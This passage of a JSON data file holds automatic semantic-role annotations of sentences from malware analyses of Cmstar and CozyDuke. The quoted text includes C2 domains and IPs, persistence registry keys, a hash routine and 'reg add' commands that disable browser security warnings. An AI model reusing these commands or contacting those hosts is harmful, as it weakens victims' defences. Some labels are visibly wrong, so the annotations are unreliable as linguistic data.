"which"}, "V": {"text": "was", "index": 29}, "ARGM-TMP": {"text": "then/ before being sent to the C2 server"}, "ARG2": {"text": "encrypted using a single - byte XOR algorithm and a key of 0x45"}}, "encrypted": {"ARG1": {"text": "an analysis environment"}, "R-ARG1": {"text": "which"}, "ARGM-TMP": {"text": "then/ before being sent to the C2 server"}, "V": {"text": "encrypted", "index": 31}, "ARGM-MNR": {"text": "using a single - byte XOR algorithm and a key of 0x45"}}, "using": {"ARG0": {"text": "which"}, "V": {"text": "using", "index": 32}, "ARG1": {"text": "a single - byte XOR algorithm and a key of 0x45"}, "ARGM-TMP": {"text": "before being sent to the C2 server"}}, "being": {"V": {"text": "being", "index": 45}}, "sent": {"ARG1": {"text": "data/ which"}, "V": {"text": "sent", "index": 46}, "ARG2": {"text": "to the C2 server"}}, "writes": {"ARG0": {"text": "the malware author"}, "V": {"text": "writes", "index": 58}, "ARG1": {"text": "log messages to the \u2018 DF64159.TMP \u2019 file"}}, "log": {"ARG0": {"text": "the malware author writes"}, "V": {"text": "log", "index": 59}, "ARG1": {"text": "messages to the \u2018 DF64159.TMP \u2019 file"}}, "used": {"V": {"text": "used", "index": 68}, "ARG2": {"text": "for debugging purposes throughout the execution of the Cmstar downloader"}}, "debugging": {"V": {"text": "debugging", "index": 70}, "ARG1": {"text": "purposes"}, "ARGM-TMP": {"text": "throughout the execution of the Cmstar downloader"}}}, " The encrypted strings within the Trojan include fields used within the\nHTTP requests that Cmstar will create to communicate with its C2 server, as well as additional strings\nused to interact with the registry": {"encrypted": {"V": {"text": "encrypted", "index": 1}, "ARG1": {"text": "strings"}}, "include": {"ARG2": {"text": "The encrypted strings within the Trojan"}, "V": {"text": "include", "index": 6}, "ARG1": {"text": "fields used within the HTTP requests that Cmstar will create to communicate with its C2 server , as well as additional strings used to interact with the registry"}}, "used": {"ARG1": {"text": "fields"}, "V": {"text": "used", "index": 8}, "ARG2": {"text": "within the HTTP requests that Cmstar will create to communicate with its C2 server"}}, "requests": {"ARGM-PRD": {"text": "HTTP"}, "V": {"text": "requests", "index": 12}, "ARGM-ADJ": {"text": "that Cmstar will create to communicate with its C2 server"}}, "will": {"V": {"text": "will", "index": 15}}, "create": {"ARG1": {"text": "the HTTP requests"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "Cmstar"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "create", "index": 16}, "ARGM-PRP": {"text": "to communicate with its C2 server"}}, "communicate": {"ARG1": {"text": "that"}, "ARG0": {"text": "Cmstar"}, "V": {"text": "communicate", "index": 18}, "ARG2": {"text": "with its C2 server"}}, "used_2": {"ARG1": {"text": "additional strings"}, "V": {"text": "used", "index": 29}, "ARG2": {"text": "to interact with the registry"}}, "interact": {"V": {"text": "interact", "index": 31}, "ARG1": {"text": "with the registry"}}}, " Instead of finding API function names based on their\nhashed values, this malware enumerates libraries\u2019 export address table (EAT) and searches for the name\nof the API function the payload needs to load by using a character to offset array": {"finding": {"V": {"text": "finding", "index": 2}, "ARG1": {"text": "API function names"}, "ARGM-MNR": {"text": "based on their hashed values"}, "ARG0": {"text": "this malware enumerates libraries \u2019 export address table"}}, "based": {"ARG1": {"text": "finding API function names"}, "V": {"text": "based", "index": 6}, "ARG2": {"text": "on their hashed values"}}, "enumerates": {"ARGM-ADV": {"text": "Instead of finding API function names based on their hashed values"}, "ARG0": {"text": "this malware"}, "V": {"text": "enumerates", "index": 14}, "ARG1": {"text": "libraries \u2019 export address table ( EAT ) and"}}, "needs": {"ARG0": {"text": "the payload"}, "V": {"text": "needs", "index": 34}, "ARG1": {"text": "to load"}, "ARGM-MNR": {"text": "by using a character to offset array"}}, "load": {"ARG0": {"text": "the payload"}, "V": {"text": "load", "index": 36}, "ARGM-MNR": {"text": "by using a character to offset array"}}, "using": {"V": {"text": "using", "index": 38}, "ARG1": {"text": "a character"}, "ARG2": {"text": "to offset array"}}, "offset": {"V": {"text": "offset", "index": 42}, "ARG1": {"text": "array"}}}, "<doc>\n<section>\n<heading> Cmstar Downloader: Lurid and Enfal\u2019s New Cousin </heading>\nIn recent weeks, Unit 42 has been analyzing delivery documents used in spear-phishing attacks that drop\na custom downloader used in cyber espionage attacks": {"has": {"V": {"text": "has", "index": 6}}, "been": {"V": {"text": "been", "index": 7}}, "analyzing": {"ARGM-TMP": {"text": "In recent weeks"}, "ARG0": {"text": "Unit 42"}, "V": {"text": "analyzing", "index": 8}, "ARG1": {"text": "delivery documents used in spear - phishing attacks that drop a custom downloader used in cyber espionage attacks"}}, "used": {"ARG1": {"text": "delivery documents"}, "V": {"text": "used", "index": 11}, "ARG2": {"text": "in spear - phishing attacks that drop a custom downloader used in cyber espionage attacks"}}, "phishing": {"V": {"text": "phishing", "index": 15}, "ARG1": {"text": "attacks"}}, "drop": {"ARG0": {"text": "spear - phishing attacks"}, "R-ARG0": {"text": "that"}, "V": {"text": "drop", "index": 18}, "ARG1": {"text": "a custom downloader used in cyber espionage attacks"}}, "used_2": {"ARG1": {"text": "a custom downloader"}, "V": {"text": "used", "index": 22}, "ARGM-LOC": {"text": "in cyber espionage attacks"}}}, " However, the code does not decrypt, reference, or use the following registry key in any way, which\nsuggests that the malware author left this artifact in the code after swapping to the run key listed above:\n\n      HKCU\\Software\\Microsoft\\CTF\\LangBarAddIn\n\fCmstar also decrypts a 752-byte piece of shellcode that carries out communications with the C2 server,\nspecifically by sending HTTP POST requests to the following URL:\n\n      http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi\n\nIt should be noted that the C2 URL contains the string \u2018cgl-bin\u2019, which visually resembles the common cgi-\nbin folder used by many webservers to run server-side scripts": {"does": {"V": {"text": "does", "index": 4}}, "decrypt": {"ARGM-DIS": {"text": "However"}, "ARG0": {"text": "the code"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "decrypt", "index": 6}, "ARG1": {"text": "the following registry key in any way"}}, "use": {"ARGM-DIS": {"text": "However"}, "ARG0": {"text": "the code"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "use", "index": 11}, "ARG1": {"text": "the following registry key"}, "ARGM-MNR": {"text": "in any way"}, "ARGM-ADV": {"text": "which suggests that the malware author left this artifact in the code after swapping to the run key listed above/ \u2018 cgl - bin \u2019/ which visually resembles the common cgi- bin folder used by many webservers to run server - side scripts"}}, "following": {"V": {"text": "following", "index": 13}, "ARG2": {"text": "registry key"}}, "suggests": {"ARG0": {"text": "the following registry key in any way"}, "R-ARG0": {"text": "which"}, "V": {"text": "suggests", "index": 21}, "ARG1": {"text": "that the malware author left this artifact in the code after swapping to the run key listed above : HKCU\\Software\\Microsoft\\CTF\\LangBarAddIn Cmstar also decrypts a 752-byte piece of shellcode that carries out communications with the C2 server , specifically by sending HTTP POST requests to the following URL : http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi It should be noted that the C2 URL contains the string \u2018 cgl - bin \u2019 , which visually resembles the common cgi- bin folder used by many webservers to run server - side scripts"}}, "left": {"ARG0": {"text": "the malware"}, "V": {"text": "left", "index": 26}, "ARG1": {"text": "this artifact"}, "ARGM-LOC": {"text": "in the code"}, "ARGM-TMP": {"text": "after swapping to the run key listed above"}}, "swapping": {"ARG0": {"text": "the malware author"}, "V": {"text": "swapping", "index": 33}, "ARG3": {"text": "to the run key listed above : HKCU\\Software\\Microsoft\\CTF\\LangBarAddIn"}}, "listed": {"ARG1": {"text": "the run key"}, "V": {"text": "listed", "index": 38}, "ARGM-LOC": {"text": "above"}}, "decrypts": {"ARG0": {"text": "HKCU\\Software\\Microsoft\\CTF\\LangBarAddIn Cmstar"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "decrypts", "index": 44}, "ARG1": {"text": "a 752-byte piece of shellcode that carries out communications with the C2 server"}, "ARGM-MNR": {"text": "specifically by sending HTTP POST requests to"}}, "carries": {"ARG0": {"text": "a 752-byte piece of shellcode"}, "R-ARG0": {"text": "that"}, "V": {"text": "carries", "index": 51}, "ARG1": {"text": "communications"}, "ARGM-ADV": {"text": "with the C2 server"}, "ARGM-MNR": {"text": "specifically by sending HTTP POST requests to the following"}}, "sending": {"V": {"text": "sending", "index": 61}, "ARG1": {"text": "HTTP POST requests"}, "ARG2": {"text": "to the following URL"}}, "following_2": {"V": {"text": "following", "index": 67}, "ARG1": {"text": "URL"}}, "http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi": {"ARG0": {"text": "shellcode"}, "V": {"text": "http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi", "index": 70}, "ARG1": {"text": "It"}}, "should": {"V": {"text": "should", "index": 72}}, "be": {"V": {"text": "be", "index": 73}}, "noted": {"R-ARG2": {"text": "It"}, "ARGM-MOD": {"text": "should"}, "V": {"text": "noted", "index": 74}, "ARG1": {"text": "that the C2 URL contains the string \u2018 cgl - bin \u2019"}}, "contains": {"ARG0": {"text": "the C2 URL"}, "V": {"text": "contains", "index": 79}, "ARG1": {"text": "the string \u2018 cgl - bin \u2019"}, "ARGM-ADV": {"text": "which visually resembles the common cgi- bin folder used by many webservers to run server - side scripts"}}, "resembles": {"ARG1": {"text": "the C2/ the string \u2018 cgl - bin \u2019"}, "R-ARG1": {"text": "which"}, "ARGM-MNR": {"text": "visually"}, "V": {"text": "resembles", "index": 90}, "ARG2": {"text": "the common cgi- bin folder used by many webservers to run server - side scripts"}}, "used": {"ARG1": {"text": "the common cgi-/ bin folder"}, "V": {"text": "used", "index": 96}, "ARG0": {"text": "by many webservers"}, "ARG2": {"text": "to run server - side scripts"}}, "run": {"V": {"text": "run", "index": 101}, "ARG1": {"text": "server - side scripts"}}}, " The embedded configuration contains nothing more than a URL that Cmstar uses as its\ncommand and control (C2) location": {"embedded": {"V": {"text": "embedded", "index": 1}, "ARG1": {"text": "configuration"}}, "contains": {"ARG0": {"text": "The embedded configuration"}, "V": {"text": "contains", "index": 3}, "ARG1": {"text": "nothing more than a URL that Cmstar uses as its command and control ( C2 ) location"}}, "uses": {"ARG1": {"text": "a URL"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "Cmstar"}, "V": {"text": "uses", "index": 11}, "ARG2": {"text": "as its command"}}}, " Unit 42\nreverse engineered the algorithm and created the function seen below to generate hashes in order to\ndetermine the processes Cmstar is trying to find:\n\n<code>\ndef hashStr(st):\n\n     hash = 0\n\n 1\n\n 2\n\n 3\n\n 4\n\n 5\n\n 6\n\n 7      def hashStr(st):\n\n 8        hash = 0\n\n 9        count = 0\n\n 10       while count < len(st):\n\n 11         h1 = (hash<<0x13)&0xFFFFFFFF\n\n 12         h2 = (hash>>0x0d)&0xFFFFFFFF\n\f 13          h3 = (h1|h2)&0xFFFFFFFF\n\n 14          hash = (h3 + (ord(st[count])^0x4a))&0xFFFFFFFF\n\n 15          count += 1\n\n 16        return hash\n\n 17\n\n 18\n\n 19\n\n 20\n\n 21\n</code>\n\n\nUnit 42 found that the string \u2018avp\u2019 subjected to the algorithm above results in the value 0x1E00AFA, which\nsuggests the Cmstar sample specifically looks for Kaspersky\u2019s Anti-virus product (avp.exe) running on the\ncompromised system": {"engineered": {"ARG0": {"text": "Unit 42 reverse"}, "V": {"text": "engineered", "index": 3}, "ARG1": {"text": "the algorithm"}}, "created": {"ARG0": {"text": "Unit"}, "V": {"text": "created", "index": 7}, "ARG1": {"text": "the function seen below"}, "ARGM-PRP": {"text": "to generate hashes in order to determine the processes Cmstar"}}, "seen": {"ARG1": {"text": "the function"}, "V": {"text": "seen", "index": 10}, "ARGM-LOC": {"text": "below"}, "ARGM-PRP": {"text": "to generate hashes in order to determine the processes Cmstar is trying to find"}}, "generate": {"V": {"text": "generate", "index": 13}, "ARG1": {"text": "hashes"}, "ARGM-PRP": {"text": "in order to determine the processes Cmstar/ trying to find"}}, "determine": {"V": {"text": "determine", "index": 18}, "ARG1": {"text": "the processes Cmstar is trying to find"}}, "is": {"V": {"text": "is", "index": 22}}, "trying": {"V": {"text": "trying", "index": 23}, "ARG1": {"text": "to find"}}, "find": {"V": {"text": "find", "index": 25}}, "found": {"ARG0": {"text": "Unit 42"}, "V": {"text": "found", "index": 29}, "ARG1": {"text": "that the string \u2018 avp \u2019 subjected to the algorithm above results in the value 0x1E00AFA , which suggests the Cmstar sample specifically looks for Kaspersky \u2019s Anti - virus product ( avp.exe ) running on the compromised system"}}, "subjected": {"ARG1": {"text": "the string \u2018 avp \u2019"}, "V": {"text": "subjected", "index": 36}, "ARG2": {"text": "to the algorithm above results"}, "ARGM-LOC": {"text": "in the value 0x1E00AFA , which suggests the Cmstar sample specifically looks for Kaspersky \u2019s Anti - virus product ( avp.exe ) running on the compromised system"}}, "suggests": {"ARG0": {"text": "the value 0x1E00AFA"}, "R-ARG0": {"text": "which"}, "V": {"text": "suggests", "index": 48}, "ARG1": {"text": "the Cmstar sample specifically looks for Kaspersky \u2019s Anti - virus product ( avp.exe ) running on the compromised system"}}, "looks": {"ARG0": {"text": "the Cmstar sample"}, "ARGM-MNR": {"text": "specifically"}, "V": {"text": "looks", "index": 53}, "ARG1": {"text": "for Kaspersky \u2019s Anti - virus product ( avp.exe ) running on the compromised system"}}, "running": {"ARG0": {"text": "Kaspersky \u2019s Anti - virus product ( avp.exe"}, "V": {"text": "running", "index": 64}, "ARG1": {"text": "on the compromised system"}}, "compromised": {"V": {"text": "compromised", "index": 67}, "ARG1": {"text": "system"}}}, " The Cmstar sample associated with the MNKIT delivery document\ncreates the following registry key to automatically execute at system startup:\n\n      HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\xpsfiltsvcs: \u201crundll32.exe\n      C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\xpsfiltsvcs.dll,XpsRegisterServer\u201d\n\nUnit 42 found an additional encrypted registry key that would allow Cmstar to automatically start up after\nreboots": {"associated": {"ARG1": {"text": "The Cmstar sample"}, "V": {"text": "associated", "index": 3}, "ARG2": {"text": "with the MNKIT delivery document"}}, "creates": {"ARG0": {"text": "The Cmstar sample associated with the MNKIT delivery document"}, "V": {"text": "creates", "index": 9}, "ARG1": {"text": "the following registry key to automatically execute at system startup : HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\xpsfiltsvcs : \u201c rundll32.exe C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\xpsfiltsvcs.dll , XpsRegisterServer \u201d Unit 42 found an additional encrypted registry key that would allow Cmstar to automatically start up after reboots"}}, "following": {"V": {"text": "following", "index": 11}, "ARG1": {"text": "registry key"}}, "execute": {"ARGM-MNR": {"text": "automatically"}, "V": {"text": "execute", "index": 16}, "ARGM-LOC": {"text": "at system startup"}}, "found": {"ARG0": {"text": "XpsRegisterServer \u201d Unit 42"}, "V": {"text": "found", "index": 31}, "ARG1": {"text": "an additional encrypted registry key that would allow Cmstar to automatically start up after reboots"}}, "encrypted": {"V": {"text": "encrypted", "index": 34}, "ARG1": {"text": "registry key"}}, "would": {"ARG1": {"text": "an additional encrypted registry key/ allow Cmstar to automatically start up after reboots"}, "R-ARG1": {"text": "that"}, "V": {"text": "would", "index": 38}}, "allow": {"ARG0": {"text": "an additional encrypted registry key"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "allow", "index": 39}, "ARG1": {"text": "Cmstar to automatically start up after reboots"}}, "start": {"ARG1": {"text": "Cmstar"}, "ARGM-MNR": {"text": "automatically"}, "V": {"text": "start", "index": 43}, "ARGM-TMP": {"text": "after reboots"}}}, " Once again, it creates several registry entries with the help of the command line tool and\ncreates an instance of the Internet Explorer (CoCreateInstance() -> d30c1661-cdaf-11d0-8a3e-\n00c04fc9e26e) for contacting the C&C server": {"creates": {"ARGM-TMP": {"text": "Once again"}, "ARG0": {"text": "it"}, "V": {"text": "creates", "index": 4}, "ARG1": {"text": "several registry entries with the help of the command line tool"}}, "creates_2": {"ARGM-TMP": {"text": "Once again"}, "ARG0": {"text": "it"}, "V": {"text": "creates", "index": 17}, "ARG1": {"text": "an instance of the Internet Explorer ( CoCreateInstance ( ) - > d30c1661-cdaf-11d0 - 8a3e- 00c04fc9e26e ) for contacting the C&C server"}}, "contacting": {"V": {"text": "contacting", "index": 36}, "ARG1": {"text": "the C&C server"}}}, " As a result, we get the following\nnetwork information:\n\n<list>\nC&C server: defense.miraclecz.com (IP: 208.115.124.83)\nHTTP GET request: /index.asp?id=50100\n</list>\n\nAlso, we see that it downloads some kind of data (Base64 encoded)": {"get": {"ARGM-ADV": {"text": "As a result"}, "ARG0": {"text": "we"}, "V": {"text": "get", "index": 5}, "ARG1": {"text": "the following network information"}}, "following": {"V": {"text": "following", "index": 7}, "ARG1": {"text": "network information"}}, "see": {"ARGM-DIS": {"text": "Also"}, "ARG0": {"text": "we"}, "V": {"text": "see", "index": 14}, "ARG1": {"text": "that it downloads some kind of data ( Base64 encoded )"}}, "downloads": {"ARG0": {"text": "it"}, "V": {"text": "downloads", "index": 17}, "ARG1": {"text": "some kind of data ( Base64 encoded )"}}, "encoded": {"ARG0": {"text": "some kind of data ( Base64"}, "V": {"text": "encoded", "index": 24}, "ARG1": {"text": ")"}}}, " It also tries to retrieve possible AntiVirus information by\nusing the COM interface (dc12a687-737f-11cf-884d-00aa004b2e24 -> IWbemLocator -> SELECT *\nFROM AntiVirusProduct)": {"tries": {"ARG0": {"text": "It"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "tries", "index": 2}, "ARG1": {"text": "to retrieve possible AntiVirus information by using the COM interface ( dc12a687 - 737f-11cf-884d-00aa004b2e24 - > IWbemLocator - > SELECT * FROM AntiVirusProduct )"}}, "retrieve": {"ARG0": {"text": "It"}, "V": {"text": "retrieve", "index": 4}, "ARG1": {"text": "possible AntiVirus information"}, "ARGM-MNR": {"text": "by using the COM interface ( dc12a687 - 737f-11cf-884d-00aa004b2e24 - > IWbemLocator - > SELECT * FROM AntiVirusProduct )"}}, "using": {"ARG0": {"text": "It"}, "V": {"text": "using", "index": 9}, "ARG1": {"text": "the COM interface ( dc12a687 - 737f-11cf-884d-00aa004b2e24 - > IWbemLocator - > SELECT * FROM AntiVirusProduct )"}}}, " The important strings are as follows:\n\n<code>\n\nSELECT * FROM AntiVirusProduct\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v PrivDiscUiShown /t\nREG_DWORD /d 1 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\" /v DEPOff /t REG_DWORD /d 1 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\" /v DisableFirstRunCustomize /t\nREG_DWORD /d 2 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\" /v Check_Associations /t REG_SZ /d no\n/f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\"\n\f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\PhishingFilter\" /v ShownVerifyBalloon /t\nREG_DWORD /d 3 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\PhishingFilter\" /v Enabled /t REG_DWORD /d\n1 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\PhishingFilter\"\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v\nWarnOnPostRedirect /t REG_DWORD /d 0 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v\nWarnonZoneCrossing /t REG_DWORD /d 0 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Connection Wizard\" /v AutoRecover /t REG_DWORD /d\n2 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Connection Wizard\" /v Completed /t REG_BINARY /d 1\n/f\n\\cmd.exe\n\n</code>\n\nTogether with the output of IDA Pro, we can see that this malware uses the command line tool cmd.exe for\nadding several registry keys to Internet Explorer": {"are": {"ARG1": {"text": "The important strings"}, "V": {"text": "are", "index": 3}, "ARG2": {"text": "as follows"}}, "follows": {"V": {"text": "follows", "index": 5}}, "can": {"V": {"text": "can", "index": 16}}, "see": {"ARGM-MNR": {"text": "Together with the output of IDA Pro"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "see", "index": 17}, "ARG1": {"text": "that this malware uses the command line tool cmd.exe for adding several registry keys to Internet Explorer"}}, "uses": {"ARG0": {"text": "this malware"}, "V": {"text": "uses", "index": 21}, "ARG1": {"text": "the command line tool cmd.exe"}, "ARG2": {"text": "for adding several registry keys to Internet Explorer"}}, "adding": {"V": {"text": "adding", "index": 28}, "ARG1": {"text": "several registry keys"}, "ARG2": {"text": "to Internet Explorer"}}}, " Furthermore, it makes use of the COM to launch an instance of Internet\nExplorer (d30c1661-cdaf-11d0-8a3e-00c04fc9e26e -> IWebBrowser2), supposedly to contact its C&C\nserver": {"makes": {"ARGM-DIS": {"text": "Furthermore"}, "ARG0": {"text": "it"}, "V": {"text": "makes", "index": 3}, "ARG1": {"text": "use of the COM to launch an instance of Internet Explorer ( d30c1661-cdaf-11d0 - 8a3e-00c04fc9e26e - > IWebBrowser2 ) , supposedly to contact its C&C server"}}, "launch": {"V": {"text": "launch", "index": 9}, "ARG1": {"text": "an instance of Internet Explorer ( d30c1661-cdaf-11d0 - 8a3e-00c04fc9e26e - > IWebBrowser2 )"}, "ARGM-ADV": {"text": "supposedly to contact"}}, "contact": {"ARGM-ADV": {"text": "supposedly"}, "V": {"text": "contact", "index": 26}, "ARG1": {"text": "its C&C server"}}}, " The\ndynamic analysis showed the malware sample contacted the C&C server, but wasn't sending any URL\nparameters (id1, id2)": {"showed": {"ARG0": {"text": "The dynamic analysis"}, "V": {"text": "showed", "index": 3}, "ARG2": {"text": "the malware"}, "ARG1": {"text": "sample contacted the C&C server"}}, "contacted": {"ARG0": {"text": "the malware sample"}, "V": {"text": "contacted", "index": 7}, "ARG1": {"text": "the C&C server"}}, "was": {"V": {"text": "was", "index": 13}}, "sending": {"ARG0": {"text": "The dynamic analysis"}, "ARGM-NEG": {"text": "n't"}, "V": {"text": "sending", "index": 15}, "ARG1": {"text": "any URL parameters"}, "ARGM-EXT": {"text": "(/ id1 , id2 )"}}}, " This time, the network information is as follows:\n\n<list>\nC&C server: buy.miraclecz.com (IP: 74.121.191.33)\nURL parameters (from strings of executable):\n%s/?id1=blank%d&id2=%d%d\n%s/?id1=%d%d\n</list>\n\nFrom the code we can see, that the sample has also the ability to encode/decode data from/to Base64": {"is": {"ARGM-TMP": {"text": "This time"}, "ARG1": {"text": "the network information"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "as follows"}}, "follows": {"V": {"text": "follows", "index": 8}}, "can": {"V": {"text": "can", "index": 14}}, "see": {"ARG1": {"text": "From/ the code"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "see", "index": 15}}, "has": {"ARG0": {"text": "the sample"}, "V": {"text": "has", "index": 20}, "ARGM-ADV": {"text": "also"}, "ARG1": {"text": "the ability to encode / decode data from / to Base64"}}, "encode": {"V": {"text": "encode", "index": 25}, "ARG1": {"text": "/ decode data"}, "ARG2": {"text": "from/ to Base64"}}, "decode": {"V": {"text": "decode", "index": 27}, "ARG1": {"text": "data"}}, "Base64": {"V": {"text": "Base64", "index": 32}}}, " Finally, the\n dropper will use the copy of rundll32.exe to load and\n execute the CozyDuke main component": {"will": {"V": {"text": "will", "index": 4}}, "use": {"ARGM-DIS": {"text": "Finally"}, "ARG0": {"text": "the dropper"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "use", "index": 5}, "ARG1": {"text": "the copy of rundll32.exe"}, "ARG2": {"text": "to load"}}, "load": {"V": {"text": "load", "index": 11}}, "execute": {"ARG0": {"text": "the dropper"}, "V": {"text": "execute", "index": 13}, "ARG1": {"text": "the CozyDuke main component"}}}, "                \n                                                              \n\n                                                              \n   <caption> FIGURE 2: THE COZYDUKE INFECTION FLOW </caption>                    \n              <figure>                                                \n                         ZIP file                             \n                                                              \n                                          Malicious link      \n               Downloads                                      \n                                                              \n                                                              \n                         ZIP file\n                                                              \n                                                              \n                   Extracts                                   \n                                                              \n                    Self-extracting                           \n                          RAR                                 \n                                                              \n\n                                                              \n            Extracts                  Extracts                \n                                                              \n                                                              \n                                                              \n                                                              \n                                                              \n    CozyDuke main dropper             Decoy document\n\n\n\n\n      Encrypted     CozyDuke\n     configuration components\n          file\n</figure>\n\n <heading> COZYDUKE MAIN DROPPER </heading>\n The main CozyDuke dropper, used for infecting hosts\n with CozyDuke, begins by checking whether the victim\n has an anti-virus product installed": {"used": {"V": {"text": "used", "index": 5}, "ARG2": {"text": "for infecting hosts with CozyDuke"}}, "infecting": {"V": {"text": "infecting", "index": 7}, "ARG0": {"text": "hosts"}, "ARG1": {"text": "with CozyDuke"}}, "begins": {"ARG1": {"text": "The main CozyDuke dropper , used for infecting hosts with CozyDuke/ whether the victim has an anti - virus product installed"}, "V": {"text": "begins", "index": 12}, "ARGM-ADV": {"text": "by checking"}}, "checking": {"ARG0": {"text": "The main CozyDuke dropper , used for infecting hosts with CozyDuke ,"}, "V": {"text": "checking", "index": 14}, "ARG1": {"text": "whether the victim has an anti - virus product installed"}}, "has": {"ARG0": {"text": "the victim"}, "V": {"text": "has", "index": 18}, "ARG1": {"text": "an anti - virus product installed"}}, "installed": {"ARG1": {"text": "an anti - virus product"}, "V": {"text": "installed", "index": 24}}}, " Secondly, we also have reason to\n believe CozyDuke has, in some instances, downloaded\n and executed droppers for DLL files reminiscent of\n OnionDuke": {"have": {"ARGM-DIS": {"text": "Secondly"}, "ARG0": {"text": "we"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "have", "index": 4}, "ARG1": {"text": "reason to believe CozyDuke has , in some instances , downloaded and executed droppers for DLL files reminiscent of OnionDuke"}}, "believe": {"ARG0": {"text": "we"}, "ARGM-CAU": {"text": "reason"}, "V": {"text": "believe", "index": 7}, "ARG1": {"text": "CozyDuke has , in some instances , downloaded and executed droppers for DLL files reminiscent of OnionDuke"}}, "has": {"ARG0": {"text": "CozyDuke"}, "V": {"text": "has", "index": 9}, "ARG1": {"text": "some instances , downloaded and executed droppers"}}, "downloaded": {"ARG0": {"text": "CozyDuke"}, "ARGM-LOC": {"text": "in some"}, "V": {"text": "downloaded", "index": 15}, "ARGM-ADV": {"text": "for DLL files reminiscent of OnionDuke"}}, "executed": {"ARG0": {"text": "CozyDuke"}, "V": {"text": "executed", "index": 17}, "ARG1": {"text": "droppers"}, "ARGM-PNC": {"text": "for DLL files reminiscent of OnionDuke"}}}, " The main component is executed by         \nthe CozyDuke dropper using a copy of rundll32.exe": {"is": {"V": {"text": "is", "index": 3}}, "executed": {"ARG1": {"text": "The main component"}, "V": {"text": "executed", "index": 4}, "ARG0": {"text": "by the CozyDuke dropper"}, "ARGM-MNR": {"text": "using a copy of rundll32.exe"}}, "using": {"V": {"text": "using", "index": 9}, "ARG1": {"text": "a copy of rundll32.exe"}}}, "           \nThe CozyDuke toolset also includes multiple kinds                \nof droppers for infecting hosts with CozyDuke or for             \nexecuting additional tools from the CozyDuke toolset": {"includes": {"ARG2": {"text": "The CozyDuke toolset"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "includes", "index": 4}, "ARG1": {"text": "multiple kinds of droppers for infecting hosts with CozyDuke or for executing additional tools from the CozyDuke toolset"}}, "infecting": {"V": {"text": "infecting", "index": 10}, "ARG0": {"text": "hosts"}, "ARG2": {"text": "with CozyDuke"}}, "executing": {"V": {"text": "executing", "index": 16}, "ARG1": {"text": "additional tools"}, "ARG2": {"text": "from the CozyDuke toolset"}}}, "\n These tasks usually involve the execution of modules or\n executables providing additional functionality": {"involve": {"ARG2": {"text": "These tasks"}, "ARGM-TMP": {"text": "usually"}, "V": {"text": "involve", "index": 3}, "ARG1": {"text": "the execution of modules or executables providing additional functionality"}}, "providing": {"ARG0": {"text": "the execution of modules or executables"}, "V": {"text": "providing", "index": 10}, "ARG1": {"text": "additional functionality"}}}, "\n    The CozyDuke toolset, which we believe has been\n    under active development since at least 2011,\n    consists of tools for infecting targeted hosts,\n    establishing and maintaining backdoor access to the\n    hosts, gathering information from them and gaining\n    further access to other hosts inside the victim\n    organization": {"believe": {"ARG1": {"text": "The CozyDuke toolset"}, "ARG0": {"text": "we"}, "V": {"text": "believe", "index": 6}, "C-ARG1": {"text": "has been under active development since at least 2011"}}, "has": {"V": {"text": "has", "index": 7}}, "been": {"ARG1": {"text": "The CozyDuke toolset"}, "R-ARG1": {"text": "which"}, "V": {"text": "been", "index": 8}, "ARG2": {"text": "under active development"}, "ARGM-TMP": {"text": "since at least 2011"}}, "consists": {"ARG1": {"text": "The CozyDuke toolset , which we believe has been under active development since at least 2011 ,"}, "V": {"text": "consists", "index": 17}, "ARG2": {"text": "of tools for infecting targeted hosts , establishing and maintaining backdoor access to the hosts , gathering information from them and gaining further access to other hosts inside the victim organization"}}, "infecting": {"V": {"text": "infecting", "index": 21}, "ARG1": {"text": "targeted hosts"}}, "targeted": {"V": {"text": "targeted", "index": 22}, "ARG1": {"text": "hosts"}}, "establishing": {"V": {"text": "establishing", "index": 25}}, "maintaining": {"V": {"text": "maintaining", "index": 27}, "ARG1": {"text": "backdoor access to the hosts , gathering information from them/ inside the victim organization"}}, "gathering": {"ARG0": {"text": "The CozyDuke toolset"}, "V": {"text": "gathering", "index": 34}, "ARG1": {"text": "information"}, "ARG2": {"text": "from them"}}, "gaining": {"V": {"text": "gaining", "index": 39}, "ARG1": {"text": "further access to other hosts inside the victim organization"}}}, " The dropper\n will additionally copy the system file rundll32.exe to the\n install location for CozyDuke": {"will": {"V": {"text": "will", "index": 2}}, "copy": {"ARG0": {"text": "The dropper"}, "ARGM-MOD": {"text": "will"}, "ARGM-MNR": {"text": "additionally"}, "V": {"text": "copy", "index": 4}, "ARG1": {"text": "the 